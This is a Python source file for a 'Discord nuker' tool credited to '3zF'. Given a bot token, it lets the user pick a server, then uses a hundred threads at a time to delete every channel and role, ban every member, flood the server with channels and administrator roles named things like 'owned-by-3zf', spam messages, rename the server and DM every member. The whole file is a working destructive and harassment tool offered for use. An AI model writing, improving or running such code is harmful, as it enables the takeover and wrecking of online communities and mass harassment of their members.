import discord, asyncio, sys, random, time, threading, os
from discord.ext import commands
from concurrent.futures import ThreadPoolExecutor

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents, help_command=None)

guild_target = None
running = True
cnt = {"v": 0}
lck = threading.Lock()

chan_list = []
role_list = []

@client.event
async def on_ready():
    global guild_target
    os.system("cls || clear")
    
    print("\033[91m██████╗ ███████╗███████╗\033[0m")
    print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
    print("\033[91m █████╔╝  ███╔╝ █████╗\033[0m")
    print("\033[91m ╚═══██╗ ███╔╝  ██╔══╝\033[0m")
    print("\033[91m██████╔╝███████╗██║\033[0m")
    print("\033[91m╚═════╝ ╚══════╝╚═╝\033[0m")
    print("\033[91m============================================================\033[0m")
    print("\033[91m  DEVELOPER : 3zF\033[0m")
    print("\033[91m  TOOL      : DISCORD NUKER\033[0m")
    print("\033[91m============================================================\033[0m")

    guilds = list(client.guilds)
    print(f"\n\033[91m[>] LOGGED AS : \033[97m{client.user}\033[0m")
    print("\033[91m============================================================\033[0m")
    
    for i, g in enumerate(guilds):
        print(f"\033[91m  [{i+1}] \033[97m{g.name} \033[91m({g.id})\033[0m")
    
    while True:
        try:
            ch = int(input(f"\n\033[91m[>] SELECT SERVER : \033[97m")) - 1
            if 0 <= ch < len(guilds):
                guild_target = guilds[ch]
                break
        except:
            pass
    
    os.system("cls || clear")
    print("\033[91m██████╗ ███████╗███████╗\033[0m")
    print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
    print("\033[91m █████╔╝  ███╔╝ █████╗\033[0m")
    print("\033[91m ╚═══██╗ ███╔╝  ██╔══╝\033[0m")
    print("\033[91m██████╔╝███████╗██║\033[0m")
    print("\033[91m╚═════╝ ╚══════╝╚═╝\033[0m")
    print("\033[91m============================================================\033[0m")
    print(f"\033[91m  TARGET : \033[97m{guild_target.name}\033[0m")
    print(f"\033[91m  ID      : \033[97m{guild_target.id}\033[0m")
    print("\033[91m============================================================\033[0m")
    menu()

def show_banner():
    print("\033[91m██████╗ ███████╗███████╗\033[0m")
    print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
    print("\033[91m █████╔╝  ███╔╝ █████╗\033[0m")
    print("\033[91m ╚═══██╗ ███╔╝  ██╔══╝\033[0m")
    print("\033[91m██████╔╝███████╗██║\033[0m")
    print("\033[91m╚═════╝ ╚══════╝╚═╝\033[0m")
    print("\033[91m============================================================\033[0m")
    print(f"\033[91m  TARGET : \033[97m{guild_target.name}\033[0m")
    print(f"\033[91m  ID      : \033[97m{guild_target.id}\033[0m")
    print("\033[91m============================================================\033[0m")

def menu():
    global running
    while running:
        print("")
        print("\033[91m┌──────────────────────────────────────────────────────────┐\033[0m")
        print("\033[91m│                                                          │\033[0m")
        print("\033[91m│              \033[97m3ZF DISCORD NUKER\033[91m                          │\033[0m")
        print("\033[91m│                                                          │\033[0m")
        print("\033[91m│           \033[91m[1]\033[97m  DELETE CHANNELS\033[91m                         │\033[0m")
        print("\033[91m│           \033[91m[2]\033[97m  DELETE ROLES\033[91m                             │\033[0m")
        print("\033[91m│           \033[91m[3]\033[97m  BAN ALL MEMBERS\033[91m                          │\033[0m")
        print("\033[91m│           \033[91m[4]\033[97m  CREATE CHANNELS\033[91m                           │\033[0m")
        print("\033[91m│           \033[91m[5]\033[97m  CREATE ROLES\033[91m                              │\033[0m")
        print("\033[91m│           \033[91m[6]\033[97m  SPAM MESSAGES\033[91m                             │\033[0m")
        print("\033[91m│           \033[91m[7]\033[97m  CHANGE SERVER NAME\033[91m                        │\033[0m")
        print("\033[91m│           \033[91m[8]\033[97m  DM ALL MEMBERS\033[91m                            │\033[0m")
        print("\033[91m│           \033[91m[0]\033[97m  EXIT\033[91m                                      │\033[0m")
        print("\033[91m│                                                          │\033[0m")
        print("\033[91m└──────────────────────────────────────────────────────────┘\033[0m")
        print("\033[0m")
        
        c = input("\033[91m[>] OPTION : \033[97m").strip()
        
        if c == "1": asyncio.run_coroutine_threadsafe(del_chans(), client.loop)
        elif c == "2": asyncio.run_coroutine_threadsafe(del_roles(), client.loop)
        elif c == "3": asyncio.run_coroutine_threadsafe(ban_all(), client.loop)
        elif c == "4":
            print("")
            n1 = input("\033[91m[>] CHANNEL NAME 1 : \033[97m").strip().lower().replace(" ","-")
            n2 = input("\033[91m[>] CHANNEL NAME 2 : \033[97m").strip().lower().replace(" ","-")
            n3 = input("\033[91m[>] CHANNEL NAME 3 : \033[97m").strip().lower().replace(" ","-")
            global chan_list
            chan_list = []
            if n1: chan_list.append(n1)
            if n2: chan_list.append(n2)
            if n3: chan_list.append(n3)
            if not chan_list:
                chan_list = ["hack-by-3zf","nuker-by-3zf","owned-by-3zf"]
            asyncio.run_coroutine_threadsafe(create_chans(), client.loop)
        elif c == "5":
            print("")
            n1 = input("\033[91m[>] ROLE NAME 1 : \033[97m").strip()
            n2 = input("\033[91m[>] ROLE NAME 2 : \033[97m").strip()
            n3 = input("\033[91m[>] ROLE NAME 3 : \033[97m").strip()
            global role_list
            role_list = []
            if n1: role_list.append(n1)
            if n2: role_list.append(n2)
            if n3: role_list.append(n3)
            if not role_list:
                role_list = ["3zf","nuked","rekt"]
            asyncio.run_coroutine_threadsafe(create_roles(), client.loop)
        elif c == "6": asyncio.run_coroutine_threadsafe(spam_all(), client.loop)
        elif c == "7":
            print("")
            asyncio.run_coroutine_threadsafe(change_name(), client.loop)
        elif c == "8":
            print("")
            asyncio.run_coroutine_threadsafe(dm_all(), client.loop)
        elif c == "0":
            running = False
            print("\033[91m[+] BYE\033[0m")
            asyncio.run_coroutine_threadsafe(client.close(), client.loop)
            sys.exit(0)

async def del_chans():
    start = time.time()
    chs = list(guild_target.channels)
    cnt["v"] = 0
    
    def work(ch):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(ch.delete())
            with lck: cnt["v"] += 1
            loop.close()
        except: pass
    
    with ThreadPoolExecutor(max_workers=100) as exe:
        exe.map(work, chs)
    
    print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m CHANNELS DELETED \033[97m[{time.time()-start:.2f}s]\033[0m")
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

async def del_roles():
    start = time.time()
    roles = [r for r in guild_target.roles if r.name != "@everyone"]
    cnt["v"] = 0
    
    def work(r):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(r.delete())
            with lck: cnt["v"] += 1
            loop.close()
        except: pass
    
    with ThreadPoolExecutor(max_workers=100) as exe:
        exe.map(work, roles)
    
    print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m ROLES DELETED \033[97m[{time.time()-start:.2f}s]\033[0m")
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

async def ban_all():
    start = time.time()
    print("\n\033[91m[!] THIS WILL BAN EVERYONE\033[0m")
    confirm = input("\033[91m[>] TYPE yes : \033[97m")
    if confirm.lower() != "yes":
        print("\033[91m[-] CANCELLED\033[0m")
        input("\033[91m[>] ENTER\033[0m")
        os.system("cls || clear"); show_banner(); menu()
        return
    
    await guild_target.fetch_members()
    members = [m for m in guild_target.members if m.id != client.user.id]
    cnt["v"] = 0
    
    def work(m):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(m.ban(reason="3zF"))
            with lck: cnt["v"] += 1
            loop.close()
        except: pass
    
    with ThreadPoolExecutor(max_workers=100) as exe:
        exe.map(work, members)
    
    print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m MEMBERS BANNED \033[97m[{time.time()-start:.2f}s]\033[0m")
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

async def create_chans():
    start = time.time()
    try:
        n = int(input("\033[91m[>] HOW MANY : \033[97m"))
    except:
        print("\033[91m[-] NUMBER\033[0m")
        input("\033[91m[>] ENTER\033[0m")
        os.system("cls || clear"); show_banner(); menu()
        return
    
    cat_id = input("\033[91m[>] CATEGORY ID (ENTER=NONE) : \033[97m").strip()
    cat = None
    if cat_id:
        try: cat = client.get_channel(int(cat_id))
        except: pass
    
    cnt["v"] = 0
    
    def work(i):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            name = random.choice(chan_list)
            if cat:
                loop.run_until_complete(guild_target.create_text_channel(name, category=cat))
            else:
                loop.run_until_complete(guild_target.create_text_channel(name))
            with lck: cnt["v"] += 1
            loop.close()
        except: pass
    
    with ThreadPoolExecutor(max_workers=100) as exe:
        exe.map(work, range(n))
    
    print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m CHANNELS CREATED \033[97m[{time.time()-start:.2f}s]\033[0m")
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

async def create_roles():
    start = time.time()
    try:
        n = int(input("\033[91m[>] HOW MANY : \033[97m"))
    except:
        print("\033[91m[-] NUMBER\033[0m")
        input("\033[91m[>] ENTER\033[0m")
        os.system("cls || clear"); show_banner(); menu()
        return
    
    ci = input("\033[91m[>] HEX COLOR (FF0000) / random : \033[97m").strip()
    if ci.lower() == "random":
        color = random.randint(0, 0xFFFFFF)
    else:
        try: color = int(ci.replace("#",""), 16)
        except: color = 0xFF0000
    
    cnt["v"] = 0
    
    def work(i):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            name = random.choice(role_list)
            loop.run_until_complete(guild_target.create_role(
                name=name,
                color=discord.Color(color),
                permissions=discord.Permissions(administrator=True)
            ))
            with lck: cnt["v"] += 1
            loop.close()
        except: pass
    
    with ThreadPoolExecutor(max_workers=100) as exe:
        exe.map(work, range(n))
    
    print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m ROLES CREATED \033[97m[{time.time()-start:.2f}s]\033[0m")
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

async def spam_all():
    start = time.time()
    try:
        per = int(input("\033[91m[>] PER CHANNEL : \033[97m"))
    except:
        print("\033[91m[-] NUMBER\033[0m")
        input("\033[91m[>] ENTER\033[0m")
        os.system("cls || clear"); show_banner(); menu()
        return
    msg = input("\033[91m[>] MESSAGE : \033[97m")
    
    chs = [c for c in guild_target.text_channels]
    cnt["v"] = 0
    
    def work(ch):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            for _ in range(per):
                loop.run_until_complete(ch.send(msg))
            with lck: cnt["v"] += per
            loop.close()
        except: pass
    
    with ThreadPoolExecutor(max_workers=100) as exe:
        exe.map(work, chs)
    
    print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m MESSAGES SENT \033[97m[{time.time()-start:.2f}s]\033[0m")
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

async def change_name():
    name = input("\033[91m[>] NEW NAME : \033[97m")
    try:
        await guild_target.edit(name=name)
        print(f"\033[91m[+] NAME : \033[97m{name}\033[0m")
    except:
        print("\033[91m[-] FAILED\033[0m")
    
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

async def dm_all():
    start = time.time()
    msg = input("\033[91m[>] MESSAGE : \033[97m")
    
    await guild_target.fetch_members()
    members = [m for m in guild_target.members if m.id != client.user.id]
    cnt["v"] = 0
    
    def work(m):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(m.send(msg))
            with lck: cnt["v"] += 1
            loop.close()
        except: pass
    
    with ThreadPoolExecutor(max_workers=100) as exe:
        exe.map(work, members)
    
    print(f"\n\033[91m[+] \033[97m{cnt['v']}\033[91m DMS SENT \033[97m[{time.time()-start:.2f}s]\033[0m")
    input("\033[91m[>] ENTER\033[0m")
    os.system("cls || clear"); show_banner(); menu()

print("\033[91m██████╗ ███████╗███████╗\033[0m")
print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
print("\033[91m █████╔╝  ███╔╝ █████╗\033[0m")
print("\033[91m ╚═══██╗ ███╔╝  ██╔══╝\033[0m")
print("\033[91m██████╔╝███████╗██║\033[0m")
print("\033[91m╚═════╝ ╚══════╝╚═╝\033[0m")
print("\033[91m============================================================\033[0m")
print("\033[91m  DEVELOPER : 3zF\033[0m")
print("\033[91m  TOOL      : DISCORD NUKER\033[0m")
print("\033[91m============================================================\033[0m")

while True:
    token = input(f"\n\033[91m[>] TOKEN : \033[97m").strip()
    if token: break

try:
    client.run(token)
except:
    os.system("cls || clear")
    print("\033[91m██████╗ ███████╗███████╗\033[0m")
    print("\033[91m╚════██╗╚══███╔╝██╔════╝\033[0m")
    print("\033[91m █████╔╝  ███╔╝ █████╗\033[0m")
    print("\033[91m ╚═══██╗ ███╔╝  ██╔══╝\033[0m")
    print("\033[91m██████╔╝███████╗██║\033[0m")
    print("\033[91m╚═════╝ ╚══════╝╚═╝\033[0m")
    print("\033[91m============================================================\033[0m")
    print("\033[91m[-] INVALID TOKEN\033[0m")
    time.sleep(2)
    os.execl(sys.executable, sys.executable, *sys.argv)
